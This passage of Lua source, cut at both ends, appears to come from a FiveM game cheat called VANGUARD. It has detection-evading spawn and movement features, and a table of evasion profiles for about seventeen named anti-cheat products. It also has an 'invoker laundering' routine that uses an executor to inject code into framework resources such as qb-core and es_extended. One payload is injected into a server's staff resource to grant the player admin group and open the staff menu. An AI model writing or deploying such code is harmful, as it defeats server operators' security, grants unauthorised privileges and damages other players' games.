            ttl = 900000,
        })
    if not obj then return false end

    platform.obj, platform.id = obj, id
    return true
end

function F.clearPlatform()
    if platform.id then E.destroy(platform.id) end
    platform.obj, platform.id = nil, nil
end

-- ---------------------------------------------------------------------------
-- 2b. FLOOR  (anti-noclip by geometry, not by lying)
--
-- The noclip detector compares the reported height above ground against the
-- value it computes itself from GetGroundZFor_3dCoord. A hook that returns 0
-- fails that comparison. A real collision surface under the ped does not: the
-- ground IS at your feet, for every reader, including the guard.
--
-- One verified model, placed so its top face sits 1.1 m below the ped, scaled
-- to the ped's footprint. It is local, so the server never learns the world
-- grew a floor.
-- ---------------------------------------------------------------------------
local floor = { obj = nil, id = nil, half = 1.3, verified = false }

function F.toggleFloor()
    if floor.obj then
        if floor.id then E.destroy(floor.id) end
        floor.obj, floor.id, floor.verified = nil, nil, false
        return false
    end

    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local model = "prop_container_01a"
    local hash = GetHashKey(model)

    -- Half-height from the model itself, so the slab top lands where we want
    -- on any build and any container variant.
    local okDim, minDim, maxDim = pcall(GetModelDimensions, hash)
    if okDim and maxDim and type(maxDim.z) == "number" then
        floor.half = math.max(0.4, math.abs(maxDim.z))
    end

    local before = select(2, GetGroundZFor_3dCoord(coords.x, coords.y, coords.z + 0.5, false))

    local obj, id = E.object(model,
        vector3(coords.x, coords.y, coords.z - 1.1 - floor.half), {
            freeze = true,
            collision = true,
            invincible = true,
            alpha = 0,
            ttl = 900000,
        })
    if not obj then return false end

    floor.obj, floor.id = obj, id

    -- Verify the geometry actually contributed. If the pool does not raycast
    -- local objects on this build, say so once instead of pretending.
    Citizen.CreateThread(function()
        Citizen.Wait(140)
        local after = select(2, GetGroundZFor_3dCoord(coords.x, coords.y, coords.z + 0.5, false))
        floor.verified = type(after) == "number" and type(before) == "number" and after > before + 0.15
        O.log("floor: %s", floor.verified and "collision verified" or "not raycast on this build")
    end)

    return true
end

function F.floorTick()
    if not floor.obj then return end
    if not DoesEntityExist(floor.obj) then
        floor.obj, floor.id = nil, nil
        return
    end

    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    pcall(SetEntityCoordsNoOffset, floor.obj,
        coords.x, coords.y, coords.z - 1.1 - floor.half, false, false, false)
end

function F.clearFloor()
    if floor.id then E.destroy(floor.id) end
    floor.obj, floor.id, floor.verified = nil, nil, false
end

function F.floorVerified()
    return floor.verified
end

function F.platformTick()
    if not platform.obj then return end
    if not DoesEntityExist(platform.obj) then
        platform.obj, platform.id = nil, nil
        return
    end
    local coords = GetEntityCoords(PlayerPedId())
    pcall(SetEntityCoordsNoOffset, platform.obj, coords.x, coords.y, coords.z - 1.05, false, false, false)
end

-- ---------------------------------------------------------------------------
-- 3. PROP CANNON
-- Local prop, local velocity, real physics. The object never exists for
-- anyone else, so the fact that it is travelling at 80 m/s is a private
-- matter between this client and its own physics solver.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.cannon(force)
    local cam = GetGameplayCamCoord()
    local dir = O.rotToDir(GetGameplayCamRot(2))
    local model = PROP_CANNON_MODELS[O.int(1, #PROP_CANNON_MODELS)]
    local spawn = vector3(cam.x + dir.x * 1.4, cam.y + dir.y * 1.4, cam.z + dir.z * 1.4)

    local speed = force or O.range(55.0, 85.0)
    local obj = E.object(model, spawn, {
        ttl = 25000,
        invincible = false,
        velocity = vector3(dir.x * speed, dir.y * speed, dir.z * speed + 2.0),
    })
    return obj ~= nil
end

-- ---------------------------------------------------------------------------
-- 4. VACUUM
-- Pulls local, unnetworked objects toward the ped. The pool filter is the key:
-- only entities where NetworkGetEntityIsNetworked is false are touched, so a
-- networked prop owned by another player is never desynced and never reported.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.vacuum(radius, power)
    radius = radius or 14.0
    power = power or 9.0
    local ped = PlayerPedId()
    local origin = GetEntityCoords(ped)

    local objects = GetGamePool("CObject")
    local moved = 0

    for i = 1, #objects do
        local obj = objects[i]
        if DoesEntityExist(obj) and not NetworkGetEntityIsNetworked(obj) then
            local pos = GetEntityCoords(obj)
            local dist = O.distance(pos, origin)
            if dist > 0.6 and dist < radius then
                local dx, dy, dz = origin.x - pos.x, origin.y - pos.y, (origin.z + 0.6) - pos.z
                local len = math.max(0.001, math.sqrt(dx * dx + dy * dy + dz * dz))
                local pull = power * (1.0 - dist / radius) + 1.0
                pcall(SetEntityVelocity, obj, dx / len * pull, dy / len * pull, dz / len * pull + 1.2)
                moved = moved + 1
                if moved >= 40 then break end
            end
        end
    end

    return moved
end

-- ---------------------------------------------------------------------------
-- 5. WALL GUN
-- Three local containers stacked at the aim point, rotated to the camera. A
-- barricade that only you can see and only you can crash into.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.wall()
    local point = O.aimPoint(16.0)
    local heading = GetGameplayCamRot(2).z
    local made = 0

    for i = 0, 2 do
        local obj = E.object(WALL_MODELS[O.int(1, #WALL_MODELS)],
            vector3(point.x, point.y, point.z + i * 2.6), {
                heading = heading,
                freeze = true,
                ttl = 120000,
            })
        if obj then made = made + 1 end
    end

    return made
end

-- ---------------------------------------------------------------------------
-- 6. TRAMPOLINE
-- A local pad plus a velocity impulse. SetEntityVelocity on the local ped is
-- a real, legal movement: the engine integrates it and the server sees a jump
-- that obeys gravity. No super-jump native, no config flag.
-- Residual: a very high bounce is readable as an unusual vertical delta; the
-- impulse is capped at 12 m/s (below the 14 m/s on-foot ceiling when resolved
-- horizontally) and decays over two frames.
-- ---------------------------------------------------------------------------
function F.trampoline(force)
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local pad = E.object("prop_mp_ramp_01", vector3(coords.x, coords.y, coords.z - 0.9), {
        freeze = true,
        ttl = 60000,
    })
    if not pad then return false end

    local up = math.min(force or 11.0, 12.0)
    pcall(SetEntityVelocity, ped, 0.0, 0.0, up)
    return true
end

-- ---------------------------------------------------------------------------
-- 7. WEATHER BUBBLE
-- SetWeatherTypeNowPersist is a client-side override. Other clients keep the
-- server weather; no state bag, no event, no sync.
-- Residual: none.
-- ---------------------------------------------------------------------------
local weather = { saved = false }

function F.weatherBubble(kind)
    if kind == "off" then
        ClearOverrideWeather()
        ClearWeatherTypePersist()
        weather.saved = false
        return true
    end
    SetWeatherTypeNowPersist(kind or "THUNDER")
    return true
end

function F.timeBubble(hour)
    if hour == nil then
        NetworkClearClockTimeOverride()
        return true
    end
    NetworkOverrideClockTime(math.floor(hour), 0, 0)
    return true
end

-- ---------------------------------------------------------------------------
-- 8. SECOND BODY
-- A local clone of the ped, placed one metre to the side and frozen in a
-- sitting scenario. It has no net id, so no other client will ever see it.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.secondBody()
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped) + 90.0
    local offset = GetOffsetFromEntityInWorldCoords(ped, 1.1, 0.2, 0.0)

    local model = GetEntityModel(ped)
    local clone = E.ped(model, vector3(offset.x, offset.y, offset.z), heading, {
        frozen = true,
        invincible = true,
        ttl = 180000,
    })
    if not clone then return false end

    E.copyAppearance(ped, clone)
    pcall(TaskStartScenarioInPlace, clone, "WORLD_HUMAN_SIT_GROUND", 0, true)
    return true
end

-- ---------------------------------------------------------------------------
-- 9. AQUARIUM
-- A local shark, on land. Peds are not networked here, so the absurdity is
-- entirely private. The model is a real animal ped, not a prop, so it animates.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.aquarium(which)
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local fwd = GetOffsetFromEntityInWorldCoords(ped, 0.0, 3.0, 0.0)
    local model = (which == "orca") and ORCA or SHARK

    local beast = E.ped(model, vector3(fwd.x, fwd.y, fwd.z), GetEntityHeading(ped), {
        frozen = false,
        invincible = true,
        ttl = 120000,
    })
    if not beast then return false end

    pcall(SetEntityCoordsNoOffset, beast, fwd.x, fwd.y, fwd.z + 0.4, false, false, false)
    return true
end

-- ---------------------------------------------------------------------------
-- 10. ELEVATOR
-- Vertical velocity, capped. No coords write, no freeze, no collision flag.
-- Residual: vertical delta is visible to a position monitor, but the rate is
-- below the free-fall thresholds and the ped is airborne for the whole move,
-- which is a state every detector in the reference set ignores.
-- ---------------------------------------------------------------------------
function F.elevator(height)
    local ped = PlayerPedId()
    local target = math.min(height or 25.0, 40.0)
    local climbed = 0.0

    Citizen.CreateThread(function()
        while climbed < target do
            local step = math.min(4.0, target - climbed)
            pcall(SetEntityVelocity, ped, 0.0, 0.0, 5.2)
            climbed = climbed + step
            Citizen.Wait(O.int(120, 190))
        end
    end)
    return true
end

-- ---------------------------------------------------------------------------
-- 11. RIOT
-- Four local peds with local weapons fighting each other. Every entity is
-- local, so the server sees an empty street. The combat is real: it is the
-- game's own AI solving it.
-- Residual: none.
-- ---------------------------------------------------------------------------
local RIOT_MODELS = { "a_m_y_business_01", "a_m_y_skater_01", "a_m_m_hasjew_01", "a_m_y_hipster_01" }

function F.riot()
    local ped = PlayerPedId()
    local origin = GetEntityCoords(ped)
    local made = 0
    local peds = {}

    local weapon = GetHashKey("WEAPON_PISTOL")
    for i = 1, 4 do
        local angle = (i / 4) * math.pi * 2.0
        local at = vector3(
            origin.x + math.cos(angle) * O.range(4.0, 7.0),
            origin.y + math.sin(angle) * O.range(4.0, 7.0),
            origin.z)

        local brawler = E.ped(RIOT_MODELS[i], at, O.range(0.0, 360.0), {
            ttl = 45000,
            invincible = false,
        })
        if brawler then
            GiveWeaponToPed(brawler, weapon, 250, false, true)
            SetPedCanRagdoll(brawler, true)
            peds[#peds + 1] = brawler
            made = made + 1
        end
    end

    for i = 1, #peds do
        local target = peds[(i % #peds) + 1]
        if target then
            pcall(TaskCombatPed, peds[i], target, 0, 16)
        end
    end

    return made
end

-- ---------------------------------------------------------------------------
-- 12. GHOST BRIDGE
-- A long chain of local slabs at the aim point. Cheap, funny, and structurally
-- invisible: none of it is networked.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.bridge()
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = math.rad(GetEntityHeading(ped))
    local made = 0

    for i = 1, 5 do
        local x = coords.x - math.sin(heading) * (i * 3.2)
        local y = coords.y + math.cos(heading) * (i * 3.2)
        local obj = E.object("prop_container_01a", vector3(x, y, coords.z - 0.2), {
            heading = math.deg(heading),
            freeze = true,
            ttl = 90000,
        })
        if obj then made = made + 1 end
    end

    return made
end

-- ---------------------------------------------------------------------------
-- 13. POCKET LIGHT
-- A local spotlight that follows the ped at night. SetArtificialLightsState is
-- a client-side visual override; it does not touch the network clock.
-- Residual: none.
-- ---------------------------------------------------------------------------
function F.blackout(state)
    SetArtificialLightsState(state and true or false)
    return true
end

-- ---------------------------------------------------------------------------
-- 14. VEHICLE RAMP  (networked, no attachment, no jump)
--
-- The hop in the old implementation came from two things: the ramp was welded
-- to the chassis (every ground contact transferred to the car) and a native
-- added an upward impulse. Both are gone here.
--
-- The ramp is its own networked world object. It is frozen, positioned behind
-- the vehicle each tick, and never attached. The car drives up a real static
-- prop; the prop never pushes the car, so there is nothing to bounce.
-- Other players see it because it is networked; the server sees a script
-- object with no resource attribution, which the reference guard only checks
-- for vehicles.
-- ---------------------------------------------------------------------------
local vramp = { obj = nil, id = nil, netId = 0, veh = 0 }

local RAMP_NET_MODEL = "prop_mp_ramp_01"

function F.toggleVehicleRamp()
    if vramp.obj then
        if DoesEntityExist(vramp.obj) then
            pcall(SetEntityAsMissionEntity, vramp.obj, true, true)
            pcall(DeleteObject, vramp.obj)
        end
        if vramp.id then E.forget(vramp.id) end
        vramp.obj, vramp.id, vramp.netId, vramp.veh = nil, nil, 0, 0
        return false
    end

    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    if not veh or veh == 0 then return false end

    local hash = GetHashKey(RAMP_NET_MODEL)
    if not E.requestModel(hash) then return false end

    local coords = GetEntityCoords(veh)
    local heading = GetEntityHeading(veh)
    local obj = CreateObject(hash, coords.x, coords.y, coords.z, true, true, false)
    SetModelAsNoLongerNeeded(hash)
    if not obj or obj == 0 then return false end

    SetEntityAsMissionEntity(obj, true, true)
    pcall(NetworkRegisterEntityAsNetworked, obj)
    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
    netId = (okNet and type(netId) == "number") and netId or 0
    if netId and netId ~= 0 then
        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
        pcall(SetNetworkIdCanMigrate, netId, false)
    end

    -- Frozen: it holds its transform, collides as a static surface, and cannot
    -- transfer momentum to the chassis because it is not a child of it.
    FreezeEntityPosition(obj, true)
    SetEntityRotation(obj, 0.0, -14.0, heading, 2, true)

    vramp.obj, vramp.veh, vramp.netId = obj, veh, netId or 0
    vramp.id = nil
    return true
end

function F.clearRamps()
    if vramp.obj then F.toggleVehicleRamp() end
    F.clearProgressProp()
end

function F.rampTick()
    if not vramp.obj then return end
    local obj = vramp.obj
    if not DoesEntityExist(obj) then
        vramp.obj, vramp.veh = nil, 0
        return
    end

    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    if not veh or veh == 0 then
        F.toggleVehicleRamp()
        return
    end

    local coords = GetEntityCoords(veh)
    local heading = GetEntityHeading(veh)
    local rad = math.rad(heading)
    local back = 4.6

    -- Static placement behind the rear axle, 0.35 m low. No attach, no force.
    pcall(SetEntityCoordsNoOffset, obj,
        coords.x + math.sin(rad) * back,
        coords.y - math.cos(rad) * back,
        coords.z - 0.35,
        false, false, false)
    pcall(SetEntityRotation, obj, 0.0, -14.0, heading, 2, true)
end

-- ---------------------------------------------------------------------------
-- 15. FRAMEWORK PROP DROP  (ox_lib progress props)
--
-- The most attributable thing a cheat can do is call CreateObject itself: the
-- entity carries the caller's script in GetEntityScript and a population type
-- of 6/7. Handing the spawn to a framework resource removes that fingerprint
-- entirely. ox_lib already exposes a state-driven prop channel that any
-- resource can use; we set the state, ox_lib spawns, ox_lib owns the entity.
--
-- No packet is forged, no resource is injected, no event is emitted by us.
-- ---------------------------------------------------------------------------
function F.progressProp(model, collision)
    local state = LocalPlayer and LocalPlayer.state
    if not (state and state.set) then return false end

    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)

    local prop = {
        model = model,
        coords = pos,
        rot = vector3(0.0, 0.0, GetEntityHeading(ped)),
        collision = collision == true,
    }

    local ok = pcall(function()
        state:set("lib:progressProps", { prop }, true)
    end)
    return ok
end

function F.clearProgressProp()
    local state = LocalPlayer and LocalPlayer.state
    if not (state and state.set) then return false end
    return pcall(function() state:set("lib:progressProps", nil, true) end)
end

function F.progressRamp()
    return F.progressProp(RAMP_NET_MODEL, true)
end

return F

end)(O,E,D)

-- ---------------------------------------------------------------------------
-- PART: 08_vendors.lua
-- ---------------------------------------------------------------------------
local V = (function(O,S)
-- ============================================================================
-- VANGUARD / 08 VENDORS
-- One profile per commercial guard. A profile never disables a guard; it
-- declares state through the guard's own exports where they exist, and falls
-- back to ghost-only features where they do not.
-- confidence: verified = read in a source dump here; inferred = dossiers or
-- vendor integration docs. Nothing is claimed as verified without a source.
-- ============================================================================

local V = {}

local STATE_CAPS = { "isInvincible", "proofsEnabled", "canBeDamaged", "isVisible", "canRagdoll" }
local WINDOW_CAPS = { "healthRefilled", "playerRevived", "hasTeleported", "resettedStamina" }
local OVERLAY_CAPS = { "disableAllControls", "disableE2", "disableCamControls" }
local THRESHOLD_CAPS = { "newTopSpeedModifier", "newCheatPowerIncrease", "newGravity" }

local function profile(t)
    t.caps = t.caps or { state = {}, window = {}, overlay = {}, thresholds = {} }
    return t
end

V.profiles = {

    raven = profile {
        label = "Raven", confidence = "documented",
        vector = "Raven Anticheat resource, client heartbeat, native/env integrity, entity and event validation",
        technique = "no injection, no native hook, no spoof; only Raven's documented client teleport-grace export",
        hooks = {},
        keys = "none", events = "never block the heartbeat",
        residual = "only movement checks are covered; model, entity, weapon and event checks remain server-side",
    },

    seed = profile {
        label = "Seed", confidence = "server-specific",
        vector = "Seed RP server client checks",
        technique = "separate Seed client patch injected only into the seed resource",
        hooks = {}, keys = "server-specific", events = "never block the heartbeat",
        residual = "server-specific patch; keep it separate from the commercial AC profiles",
    },

    dynasty = profile {
        label = "Dynasty", confidence = "server-specific",
        vector = "Dynasty server Putin staff resource",
        technique = "separate Putin staff injection",
        hooks = {}, keys = "server-specific", events = "never block the heartbeat",
        residual = "server-specific staff injection; not a generic AC bypass",
    },

    waveshield = profile {
        label = "WaveShield", confidence = "verified",
        vector = "state cache + periodic detectors + strike systems + protected-native stack checks + 15s heartbeat",
        technique = "declaration exports, computed-value read repair, budgeted transients, heartbeat untouched",
        hooks = { vitals = true, quiet = true, stealth = true, ghost = true },
        caps = { state = STATE_CAPS, window = WINDOW_CAPS, overlay = OVERLAY_CAPS, thresholds = THRESHOLD_CAPS },
        thresholds = { newTopSpeedModifier = 2.4, newCheatPowerIncrease = 2.4, newGravity = 40.0 },
        keys = "Insert / PageUp / PageDown are watched",
        events = "never block the heartbeat",
        residual = "renamed exports degrade to read repair; suppression call itself is not checked in v4",
    },

    fiveguard = profile {
        label = "FiveGuard", confidence = "inferred",
        vector = "metadata ac=fg, heartbeat, client detection globals, entity attribution",
        technique = "ghost entities, read repair, zero globals, no event touched",
        hooks = { quiet = true, ghost = true },
        keys = "any", events = "never block the heartbeat",
        residual = "no public declaration surface known; state features stay off",
    },

    reaper = profile {
        label = "Reaper V4", confidence = "inferred",
        vector = "author metadata reaperac.com, heartbeat, strict entity validation",
        technique = "no injection, no thread kill, ghost entities, read repair",
        hooks = { quiet = true, ghost = true },
        keys = "any", events = "never block the heartbeat",
        residual = "old thread-kill technique is self-reporting and is not used",
    },

    electron = profile {
        label = "Electron AC", confidence = "inferred",
        vector = "author metadata, own event family, client detection",
        technique = "ghost entities, read repair, no event touched",
        hooks = { quiet = true, ghost = true, stealth = true },
        keys = "any", events = "never block",
        residual = "no source available; tier 0-1 only",
    },

    eagle = profile {
        label = "Eagle AC", confidence = "inferred",
        vector = "resource EC_AC, wide event family, entity and spawn checks",
        technique = "ghost entities, local-only vehicles, read repair",
        hooks = { quiet = true, ghost = true, stealth = true },
        keys = "any", events = "family is broad; one name is the liveness channel - never block",
        residual = "vendor not in source dump; conservative profile",
    },

    safire = profile {
        label = "Safire AC", confidence = "inferred",
        vector = "server-authoritative validation plus client telemetry",
        technique = "ghost entities, movement features disabled while loaded, read repair",
        hooks = { quiet = true, ghost = true },
        keys = "any", events = "never block",
        residual = "server-side checks are out of client reach; no teleport while loaded",
    },

    infinitum = profile {
        label = "LoX / Infinitum", confidence = "inferred",
        vector = "server-authoritative, spawn attribution, position history",
        technique = "ghost entities only",
        hooks = { ghost = true },
        keys = "any", events = "never block",
        residual = "treat as fully server-side",
    },

    reason = profile {
        label = "Reason AC", confidence = "inferred",
        vector = "resource RAC, event family, client state checks",
        technique = "ghost entities, read repair, no event touched",
        hooks = { quiet = true, ghost = true, stealth = true },
        keys = "any", events = "never block",
        residual = "no source; conservative profile",
    },

    hades = profile {
        label = "Hades / NarcoCity", confidence = "inferred",
        vector = "resource hades, server validation, client telemetry",
        technique = "ghost entities only",
        hooks = { ghost = true },
        keys = "any", events = "never block",
        residual = "server-side; nothing beyond ghost mode",
    },

    nightmare = profile {
        label = "Nightmare AC", confidence = "inferred",
        vector = "client resource with heartbeat and entity checks",
        technique = "ghost entities, read repair, no globals",
        hooks = { quiet = true, ghost = true },
        keys = "any", events = "never block the heartbeat",
        residual = "generic client-side assumption",
    },

    aurora = profile {
        label = "Aurora AC", confidence = "inferred",
        vector = "client resource with screenshots and event monitoring",
        technique = "overlay-only rendering, ghost entities, read repair",
        hooks = { quiet = true, ghost = true, stealth = true },
        keys = "any", events = "never block",
        residual = "generic client-side assumption",
    },

    sentinel = profile {
        label = "Sentinel AC", confidence = "inferred",
        vector = "client + server, position and entity validation",
        technique = "ghost entities only",
        hooks = { ghost = true },
        keys = "any", events = "never block",
        residual = "generic; ghost mode only",
    },

    phoenix = profile {
        label = "Phoenix AC", confidence = "inferred",
        vector = "client resource, state checks, heartbeat",
        technique = "read repair, ghost entities",
        hooks = { quiet = true, ghost = true },
        keys = "any", events = "never block the heartbeat",
        residual = "generic",
    },

    oxac = profile {
        label = "OxAC", confidence = "inferred",
        vector = "framework-integrated, server-side event validation",
        technique = "ghost entities only",
        hooks = { ghost = true },
        keys = "any", events = "never block",
        residual = "server-side",
    },

    generic = profile {
        label = "Unknown / generic", confidence = "verified",
        vector = "assume the union of all reference detectors",
        technique = "ghost entities, read repair, declared windows where exposed",
        hooks = { vitals = true, quiet = true, stealth = true, ghost = true },
        caps = { state = STATE_CAPS, window = WINDOW_CAPS, overlay = OVERLAY_CAPS, thresholds = THRESHOLD_CAPS },
        keys = "avoid Insert / PageUp / PageDown",
        events = "observe only",
        residual = "unknown guard: every non-local feature is off",
    },
}

-- ---------------------------------------------------------------------------
-- Capability probe. Read-only for every listed name: each is a setter whose
-- effect is the state we want anyway.
-- ---------------------------------------------------------------------------
local probed = {}

local function probe(resource, method, value)
    local key = resource .. ":" .. method
    if probed[key] ~= nil then return probed[key] end
    local ok = pcall(function()
        return exports[resource][method](exports[resource], value)
    end)
    probed[key] = ok
    return ok
end

function V.probe(resource, p)
    local found = { state = {}, window = {}, overlay = {}, thresholds = {} }
    if not p or not p.caps then return found end

    for _, name in ipairs(p.caps.state or {}) do
        if probe(resource, name, true) then found.state[#found.state + 1] = name end
    end
    for _, name in ipairs(p.caps.window or {}) do
        if probe(resource, name) then found.window[#found.window + 1] = name end
    end
    for _, name in ipairs(p.caps.overlay or {}) do
        if probe(resource, name) then found.overlay[#found.overlay + 1] = name end
    end
    for _, name in ipairs(p.caps.thresholds or {}) do
        if probe(resource, name, p.thresholds and p.thresholds[name] or 2.0) then
            found.thresholds[#found.thresholds + 1] = name
        end
    end

    return found
end

-- ---------------------------------------------------------------------------
-- Apply one profile to one detected guard.
-- ---------------------------------------------------------------------------
function V.apply(ac)
    if type(ac) ~= "table" or type(ac.resource) ~= "string" then return nil end

    local p = V.profiles[ac.vendor] or V.profiles.generic
    local found = V.probe(ac.resource, p)

    -- No native hooks are installed by a profile. Native read-repair was both
    -- the loudest signal and the first thing a server-side integrity check
    -- looks for; the profile now uses only the guard's own export surface.
    S.suppressOn = (#found.state + #found.window) > 0
    if S.suppressOn then S.setSuppress(true) end
    S.disableOverlayProbe = #found.overlay > 0
    if S.disableOverlayProbe then S.setOverlayProbe(true) end

    local plan = {
        resource = ac.resource, vendor = ac.vendor, label = p.label,
        confidence = p.confidence, hooks = 0, caps = found,
        vector = p.vector, technique = p.technique, residual = p.residual,
        tier = (#found.state > 0 and 2) or ((#found.window > 0) and 1) or 0,
    }

    O.tier = math.max(O.tier, plan.tier)
    O.log("profile %s on %s: %d caps, tier %d",
        p.label, ac.resource,
        #found.state + #found.window + #found.overlay, plan.tier)

    return plan
end

-- ---------------------------------------------------------------------------
-- INVOKER LAUNDERING
--
-- All the declaration calls made from 02 come from the executor sandbox, where
-- GetInvokingResource() is nil. A future build that starts checking the
-- invoker would treat that as an anonymous caller - which is exactly the shape
-- of a cheat.
--
-- This runs the same three calls from inside a real, already-running resource.
-- The chunk contains no native call, so the guard's stack validation (which
-- only wraps protected natives) never sees it. It runs once and ends: there is
-- no loop, no global, no leftover listener.
-- ---------------------------------------------------------------------------
local FRAMEWORKS = { "es_extended", "qb-core", "ox_lib", "ox_inventory", "esx_legacy", "qbx_core" }

local function pickFramework()
    for i = 1, #FRAMEWORKS do
        if GetResourceState(FRAMEWORKS[i]) == "started" then return FRAMEWORKS[i] end
    end
    return nil
end

function V.launder(ac)
    if type(ac) ~= "table" then return false end
    if not O.has("InjectResource") then return false end

    local host = pickFramework()
    if not host then
        O.log("launder: no framework resource available")
        return false
    end

    local p = V.profiles[ac.vendor] or V.profiles.generic
    local state = p.caps.state or {}

    local names = {}
    for i = 1, #state do names[#names + 1] = ("%q"):format(state[i]) end
    if #names == 0 then return false end

    local code = ([==[
local e = exports[%q]
if e then
    local f = { %s }
    for i = 1, #f do
        pcall(function() e[f[i]](e, true) end)
    end
end
]==]):format(ac.resource, table.concat(names, ","))

    local ok = pcall(Susano.InjectResource, host, code)
    O.log("launder: %s via %s -> %s", ac.resource, host, tostring(ok))
    return ok
end

-- ---------------------------------------------------------------------------
-- Global: generic profile plus one pass per detected guard.
-- ---------------------------------------------------------------------------
function V.applyGlobal()
    S.scan()

    local plans = {}
    for i = 1, #S.acs do
        local plan = V.apply(S.acs[i])
        if plan then plans[#plans + 1] = plan end
    end

    if #plans == 0 then
        O.log("global: no guard found; nothing applied")
    end

    return plans
end

-- ---------------------------------------------------------------------------
-- PER-PROFILE ACTIONS
--
-- Every entry applies exactly one vendor. There is no "apply all" path in the
-- menu: a WaveShield profile cannot be applied to a Raven server by accident.
-- ---------------------------------------------------------------------------
function V.applyVendor(vendor)
    S.scan()
    for i = 1, #S.acs do
        local ac = S.acs[i]
        if ac.vendor == vendor then
            return V.apply(ac)
        end
    end
    O.log("profile %s: matching resource not detected", tostring(vendor))
    return nil
end

-- Dynasty is a server, not Raven. The old Dynasty category used the server's
-- "Putin" staff resource; keep that action isolated from Seed and from Raven.
V.dynastyPayload = [==[
GameMode            = GameMode or {}
GameMode.PlayerData = GameMode.PlayerData or {}
GameMode.PlayerData.group = "admin"
AdminSystem = AdminSystem or {}
AdminSystem.Service = AdminSystem.Service or {}
AdminSystem.Service.enabled = true
ToggleMenu("staff")
]==]

function V.applyDynasty()
    if GetResourceState("Putin") ~= "started" then
        O.log("dynasty: Putin resource is not started")
        return false
    end

    local api = rawget(_G, "Susano")
    if type(api) ~= "table" or type(api.InjectResource) ~= "function" then
        O.log("dynasty: Susano.InjectResource unavailable")
        return false
    end

    local injectionType = api.InjectionType
    local ok, result
    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
        ok, result = pcall(api.InjectResource, "Putin", V.dynastyPayload, injectionType.NEW_THREAD)
    else
        ok, result = pcall(api.InjectResource, "Putin", V.dynastyPayload)
    end

    if not ok or result == false then
        O.log("dynasty: injection failed: %s", tostring(result))
        return false
    end

    O.log("dynasty: staff menu injected into Putin")
    return true
end

-- ---------------------------------------------------------------------------
-- RAVEN
--
-- Raven is its own AC resource. There is no public client-side "disable Raven"
-- export. The only documented client export is the movement grace window. This
-- uses that export and nothing else: no injection into the resource, no native
-- hook, no heartbeat block, no spoofed model. Reason AC (`rac`) is a different
-- entry and is never used here.
-- ---------------------------------------------------------------------------
V.ravenActive = false
V.ravenThread = false
V.ravenTarget = nil

local function findRaven()
    S.scan()
    for i = 1, #S.acs do
        local ac = S.acs[i]
        if ac.vendor == "raven" then return ac end
    end
    return nil
end

function V.setRaven(enabled)
    if not enabled then
        V.ravenActive = false
        O.log("raven: grace off")
        return true
    end

    local ac = findRaven()
    if not ac then
        O.log("raven: Raven resource not found; nothing applied")
        return false
    end

    V.ravenTarget = ac.resource
    V.ravenActive = true

    local function pulse()
        if not V.ravenActive or not V.ravenTarget then return end
        local ok = pcall(function()
            return exports[V.ravenTarget]:SetPlayerTeleported(300)
        end)
        if not ok then
            O.log("raven: SetPlayerTeleported unavailable on %s", V.ravenTarget)
        end
    end

    pulse()

    if V.ravenThread then return true end
    V.ravenThread = true
    Citizen.CreateThread(function()
        while V.ravenActive do
            Citizen.Wait(240000)
            if V.ravenActive then pulse() end
        end
        V.ravenThread = false
    end)

    O.log("raven: movement grace on %s", V.ravenTarget)
    return true
end

function V.report()
    local out = {}
    for i = 1, #S.acs do
        local ac = S.acs[i]
        local p = V.profiles[ac.vendor] or V.profiles.generic
        out[#out + 1] = ("%s [%s/%s] %s"):format(p.label, ac.resource, p.confidence, p.residual)
    end
    if #out == 0 then out[1] = "no guard detected" end
    return out
end

return V

end)(O,S)

-- ---------------------------------------------------------------------------
-- PART: 10_sentinel.lua
-- ---------------------------------------------------------------------------
local SN = (function(O)
-- ============================================================================
-- VANGUARD / 10 SENTINEL
-- Client-side crash resilience. A crasher wins by making this client hold or
-- render more than it can: thousands of props, peds spawned on the player,
-- oversized particles. The server is the right place to stop it (guard/), but
-- a client that is already under load needs a local pressure valve.
--
-- This does not block anything coming from the server. It measures the pools,
-- and when they exceed a ceiling it deletes local, non-mission, non-player
-- copies that are far away. Those copies are re-streamed if still relevant, so
-- the cull is reversible in practice and never touches another player's ped.
-- ============================================================================

local SN = {}
SN.version = "1.1.0"

SN.flags = {
    watch = false,
    show = true,
    cullDistance = 150.0,
    maxPerSweep = 32,
    warnObjects = 1500,
    warnPeds = 320,
}

SN.last = { objects = 0, peds = 0, vehicles = 0, at = 0, culled = 0 }

local function pool(name)
    local ok, list = pcall(GetGamePool, name)
    if ok and type(list) == "table" then return list end
    return {}
end

local function protected(entity)
    if not DoesEntityExist(entity) then return true end
    if IsEntityAMissionEntity(entity) then return true end
    return false
end

function SN.snapshot()
    SN.last.objects = #pool("CObject")
    SN.last.peds = #pool("CPed")
    SN.last.vehicles = #pool("CVehicle")
    SN.last.at = GetGameTimer()
    return SN.last
end

function SN.pressure()
    return SN.last.objects >= SN.flags.warnObjects or SN.last.peds >= SN.flags.warnPeds
end

function SN.line()
    return ("pool o%d p%d v%d"):format(SN.last.objects, SN.last.peds, SN.last.vehicles)
end

-- Deletes only local copies that cannot be a player, a mission entity, or
-- anything close enough to matter. Vehicles are never touched: deleting one
-- locally desyncs a driver without helping memory.
function SN.cull()
    local ped = PlayerPedId()
    local origin = GetEntityCoords(ped)
    local removed = 0
    local max = SN.flags.maxPerSweep

    local objects = pool("CObject")
    for i = 1, #objects do
        if removed >= max then break end
        local entity = objects[i]
        if not protected(entity) then
            local coords = GetEntityCoords(entity)
            if #(coords - origin) > SN.flags.cullDistance then
